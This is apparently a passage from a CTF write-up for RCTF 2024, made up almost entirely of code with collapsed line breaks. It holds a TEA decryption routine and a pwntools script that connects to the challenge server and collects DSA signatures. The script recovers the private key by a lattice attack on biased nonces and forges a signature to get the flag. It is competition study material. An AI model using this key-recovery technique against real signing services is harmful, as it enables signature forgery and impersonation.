def tea_dec(v, key): y, z = c_uint64(v[0]), c_uint64(v[1]) _sum = c_uint64(delta*32+2) for i in range(32): z.value -= ((y.value<<4) + key[2]) ^ (y.value + _sum.value) ^ ((y.value>>5) + key[3]) y.value -= ((z.value<<4) + key[0]) ^ (z.value + _sum.value) ^ ((z.value>>5) + key[1]) if i < 2: _sum.value -= 1 _sum.value -= delta # print(f'round:{i} 0x{y.value:08x} 0x{z.value:08x}') return [y.value, z.value]

# -0xad48dd59067c4282# -0x323f2d5a909af1a6# 0x3030303030303030# 0x3131313131313131v0, v1 = struct.unpack('<2Q', b'0000000000000000')v0, v1 = tea_enc([v0, v1], key1)print(f'0x{v0:016x} 0x{v1:016x}')

v0, v1 = tea_dec([-0xad48dd59067c4282 & (2**64-1), -0x323f2d5a909af1a6 & (2**64-1)], key1)print(f'0x{v0:016x} 0x{v1:016x}')
print(struct.pack('<2Q', v0, v1))# v91261+v92077+0xdf880ab397173428, v92077+0x323f2d5a909af1a6# print(f'0x{c_uint64((v0+v1)).value:016x}')# v0, v1 = tea_dec([-0xad48dd59067c4282 & (2**64-1), -0x323f2d5a909af1a6 & (2**64-1)], key1)# print(f'0x{v0:016x} 0x{v1:016x}')
# 0000000000000000
```



```
from pwn import *import stringimport hashlib#context.log_level = 'debug'from sage.all_cmdline import * import randomfrom hashlib import sha1from gmpy2 import *from Crypto.Util.number import *r = remote('121.37.182.7', 10089)se = lambda data :r.send(data) sa = lambda delim,data :r.sendafter(delim, data)sl = lambda data :r.sendline(data)sla = lambda delim,data :r.sendlineafter(delim, data)sea = lambda delim,data :r.sendafter(delim, data)rc = lambda numb=4096 :r.recv(numb)rl = lambda :r.recvline()ru = lambda delims :r.recvuntil(delims)uu32 = lambda data :u32(data.ljust(4, ' '))uu64 = lambda data :u64(data.ljust(8, ' '))info_addr = lambda tag, addr :r.info(tag + ': {:#x}'.format(addr))

def flatter(M): # compile https://github.com/keeganryan/flatter and put it in $PATH z = "[[" + "]n[".join(" ".join(map(str, row)) for row in M) + "]]" ret = check_output(["flatter"], input=z.encode()) return matrix(M.nrows(), M.ncols(), map(int, findall(b"-?\d+", ret)))

for lllll in range(20): ru(b"your pubKey: (") pqstr=ru(b")")[:-1] pqmb=['p','q','g','y'] pqstr=pqstr.decode() print(pqstr) pqstr=pqstr.split(',') p=int(pqstr[0]) q=int(pqstr[1]) g=int(pqstr[2]) y=int(pqstr[3]) print("p=",p) print("q=",q) print("g=",g) print("y=",y) mm=[] rr=[] ss=[] for i in range(19): msg='a' mm.append(int(sha1(msg.encode()).hexdigest(), 16)) ru(b">") sl("1") ru(b"to sign?: ") sl("a") #sla("to sign?: ","a") ru(b"Signature: (") tmprs=ru(b")")[:-1].decode() tmprs=tmprs.split(',') r0=int(tmprs[0]) s0=int(tmprs[1]) rr.append(r0) ss.append(s0) aaxx=[] bbxx=[] aa0=inverse(ss[0],q)*mm[0]%q bb0=inverse(ss[0],q)*rr[0]%q for i in range(18): aatmp=(inverse(ss[i+1],q)*mm[i+1]-aa0)*inverse(4,q)%q bbtmp=(inverse(ss[i+1],q)*rr[i+1]-bb0)*inverse(4,q)%q aaxx.append(aatmp) bbxx.append(bbtmp) RR=RationalField(160) M=Matrix(RR,20,20) for i in range(18): M[0,i]=bbxx[i] M[1,i]=aaxx[i] M[2+i,i]=q M[0,18]=1/2**10 M[1,19]=2**150 res=M.LLL() print(res[0]) print(res[1]) print(res[2]) print(x,x-q,q-x,2**159) print("*"*32) for kk in res: if abs(kk[19])==2**150: print(abs(kk[19])) print(len(bin(abs(kk[0])))) print(len(bin(abs(kk[18]*2**10)))) print(kk[18]*2**10) x1=(kk[18]*2**10)%q if pow(g, x1, p)==y: print("ok"*16) print(x1) x1=int(x1) k=(mm[0]+x1*rr[0])*inverse(ss[0],q)%q r0 = pow(g, k, p) % q print(rr[0],r0,k) msgxx=b"get flag" Hm=int(sha1(msgxx).hexdigest(), 16) s=(Hm + x1 * r0) * inverse(k, q) % q print("r=",r0) print("s=",s) ru(b">") sl("2") sla(b'verify?:',"get flag") sla(b'r:',str(r0)) sla(b's:',str(s)) r.interactive() break r.close() r = remote('121.37.182.7', 10089)
#RCTF{Ev3ry_fighter_h@s_their_signature_style}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/7-1716888236.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/7-1716888239.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/2-1716888241.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/4-1716888244.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/5-1716888245.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/4-1716888247.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/0-1716888249.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/7-1716888251.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/2-1716888252.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/5-1716888253.png)